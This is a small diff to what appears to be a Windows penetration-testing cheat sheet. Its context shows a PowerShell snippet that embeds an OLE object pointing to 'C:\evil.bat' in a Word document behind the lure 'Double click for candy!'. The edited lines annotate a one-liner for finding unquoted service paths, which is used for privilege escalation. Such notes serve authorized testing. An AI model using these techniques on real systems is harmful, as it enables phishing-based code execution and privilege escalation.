@@ -9,5 +9,5 @@ $objSelection = $word.Selection
 $objSelection.TypeText("Double click for candy!")
 $objSelection.InlineShapes.AddOLEObject('','C:\evil.bat',$false,$true,'C:\candy.ico')
 
-Find unqouted service paths without access to wmic:
+Find unqouted service paths without access to wmic (this currently does not find services with spaces in them)
 for /f "tokens=2" %i in ('sc query ^|findstr "SERVICE_NAME"') do sc qc %i | findstr "BINARY_PATH_NAME" >> output.txt
